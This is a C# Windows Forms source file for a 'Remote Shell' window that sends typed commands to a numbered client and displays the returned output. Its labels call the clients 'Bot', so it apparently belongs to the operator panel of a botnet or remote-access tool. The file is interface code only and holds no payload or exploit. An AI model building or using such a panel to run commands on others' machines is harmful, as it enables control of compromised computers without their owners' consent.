using System;
using System.Windows.Forms;
using System.Drawing;

namespace Server.UI
{
    public partial class RemoteShellForm : Form
    {
        private int _connectionId;
        private Action<int, string> _sendCommandCallback;
        private RichTextBox txtConsole = null!;
        private TextBox txtCommand = null!;
        private Label lblStatus = null!;
        private string _lastOutputHash = "";
        private string _currentDirectory = "";

        public RemoteShellForm(int connectionId, string clientIp, Action<int, string> sendCommandCallback)
        {
            _connectionId = connectionId;
            _sendCommandCallback = sendCommandCallback;
            
            InitializeComponent();
            InitializeCustomComponents(clientIp);
        }

        private void InitializeCustomComponents(string clientIp)
        {
            this.Text = $"Remote Shell - Connection #{_connectionId} ({clientIp})";
            this.Size = new Size(900, 600);
            this.StartPosition = FormStartPosition.CenterParent;
            this.FormBorderStyle = FormBorderStyle.Sizable;
            this.MinimumSize = new Size(600, 400);

            // Top panel - Status
            Panel topPanel = new Panel
            {
                Dock = DockStyle.Top,
                Height = 40,
                BackColor = Color.FromArgb(40, 40, 40),
                Padding = new Padding(10, 10, 10, 5)
            };

            lblStatus = new Label
            {
                Text = $"🟢 Connected to Bot #{_connectionId} | Ready to send commands",
                Dock = DockStyle.Fill,
                ForeColor = Color.Lime,
                Font = new Font("Consolas", 10, FontStyle.Bold)
            };

            topPanel.Controls.Add(lblStatus);

            // Console output area
            txtConsole = new RichTextBox
            {
                Dock = DockStyle.Fill,
                BackColor = Color.Black,
                ForeColor = Color.White,
                Font = new Font("Consolas", 10),
                ReadOnly = true,
                Multiline = true,
                ScrollBars = RichTextBoxScrollBars.Vertical,
                WordWrap = true
            };

            // Bottom panel - Command input
            Panel bottomPanel = new Panel
            {
                Dock = DockStyle.Bottom,
                Height = 50,
                BackColor = Color.FromArgb(45, 45, 48),
                Padding = new Padding(10)
            };

            Label lblPrompt = new Label
            {
                Text = "cmd>",
                Location = new Point(10, 15),
                AutoSize = true,
                ForeColor = Color.Yellow,
                Font = new Font("Consolas", 11, FontStyle.Bold)
            };

            txtCommand = new TextBox
            {
                Location = new Point(60, 12),
                Width = 700,
                BackColor = Color.FromArgb(30, 30, 30),
                ForeColor = Color.Lime, // Changed to Lime for better visibility
                Font = new Font("Consolas", 11),
                BorderStyle = BorderStyle.FixedSingle,
                TabStop = true,
                Enabled = true
            };
            txtCommand.KeyDown += TxtCommand_KeyDown;
            txtCommand.Anchor = AnchorStyles.Left | AnchorStyles.Right | AnchorStyles.Top;
            txtCommand.TextChanged += (s, e) => 
            {
                // Debug output to verify text is being entered
                System.Diagnostics.Debug.WriteLine($"TextBox content: '{txtCommand.Text}'");
            };

            Button btnSend = new Button
            {
                Text = "Send",
                Location = new Point(770, 10),
                Size = new Size(80, 28),
                BackColor = Color.FromArgb(0, 120, 215),
                ForeColor = Color.White,
                FlatStyle = FlatStyle.Flat,
                Font = new Font("Segoe UI", 9, FontStyle.Bold)
            };
            btnSend.Click += BtnSend_Click;
            btnSend.Anchor = AnchorStyles.Right | AnchorStyles.Top;

            bottomPanel.Controls.AddRange(new Control[] { lblPrompt, txtCommand, btnSend });

            // Add all to form
            this.Controls.Add(txtConsole);
            this.Controls.Add(bottomPanel);
            this.Controls.Add(topPanel);

            // Welcome message
            AppendToConsole($"=== Remote Shell Session Started ===", Color.Cyan);
            AppendToConsole($"Connection ID: {_connectionId}", Color.Gray);
            AppendToConsole($"Client IP: {clientIp}", Color.Gray);
            AppendToConsole($"Time: {DateTime.Now:yyyy-MM-dd HH:mm:ss}", Color.Gray);
            AppendToConsole($"===================================\n", Color.Cyan);
            AppendToConsole("Type commands and press Enter to execute on remote client.\n", Color.Yellow);
            AppendToConsole("cmd> ", Color.Yellow, false);

            txtCommand.Focus();
        }

        private void TxtCommand_KeyDown(object? sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter)
            {
                e.SuppressKeyPress = true;
                SendCommand();
            }
        }

        private void BtnSend_Click(object? sender, EventArgs e)
        {
            SendCommand();
        }

        private void SendCommand()
        {
            string command = txtCommand.Text.Trim();
            if (string.IsNullOrEmpty(command))
                return;

            // Display command in console
            AppendToConsole(command + "\n", Color.White);

            // Send command via callback
            try
            {
                _sendCommandCallback(_connectionId, command);
                lblStatus.Text = $"🟡 Command sent: '{command}' - Waiting for response...";
                lblStatus.ForeColor = Color.Yellow;
            }
            catch (Exception ex)
            {
                AppendToConsole($"[Error] Failed to send command: {ex.Message}\n", Color.Red);
            }

            txtCommand.Clear();
        }

        public void AppendOutput(string output)
        {
            if (txtConsole.InvokeRequired)
            {
                txtConsole.Invoke(() => AppendOutput(output));
                return;
            }

            // Check for duplicate output
            string outputHash = output.GetHashCode().ToString();
            if (outputHash == _lastOutputHash && !string.IsNullOrWhiteSpace(output))
            {
                return; // Skip duplicate
            }
            _lastOutputHash = outputHash;

            // Clean output: remove control characters except newlines
            string cleaned = System.Text.RegularExpressions.Regex.Replace(output, @"[\x00-\x09\x0B-\x0C\x0E-\x1F]", "");
            
            // Extract directory from prompt pattern: "Drive:\path>command"
            var promptMatch = System.Text.RegularExpressions.Regex.Match(cleaned, @"([A-Za-z]:\\[^>]+)>");
            if (promptMatch.Success)
            {
                string newDir = promptMatch.Groups[1].Value;
                if (newDir != _currentDirectory)
                {
                    _currentDirectory = newDir;
                    AppendToConsole($"\n[Directory: {_currentDirectory}]\n", Color.Cyan);
                }
                // Remove prompt from output
                cleaned = System.Text.RegularExpressions.Regex.Replace(cleaned, @"[A-Za-z]:\\[^>]+>[^\r\n]*[\r\n]*", "");
            }

            // Only display if there's actual content after cleaning
            if (!string.IsNullOrWhiteSpace(cleaned))
            {
                AppendToConsole(cleaned + "\n", Color.LightGray);
            }
            
            AppendToConsole("cmd> ", Color.Yellow, false);
            
            lblStatus.Text = $"🟢 Connected to Bot #{_connectionId} | Ready to send commands";
            lblStatus.ForeColor = Color.Lime;

            // Focus back to input
            txtCommand.Focus();
        }

        private void AppendToConsole(string text, Color color, bool newLine = true)
        {
            txtConsole.SelectionStart = txtConsole.TextLength;
            txtConsole.SelectionLength = 0;
            txtConsole.SelectionColor = color;
            txtConsole.AppendText(newLine ? text : text);
            txtConsole.ScrollToCaret();
        }

        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            base.OnFormClosing(e);
            AppendToConsole("\n=== Session Ended ===\n", Color.Cyan);
        }
    }
}
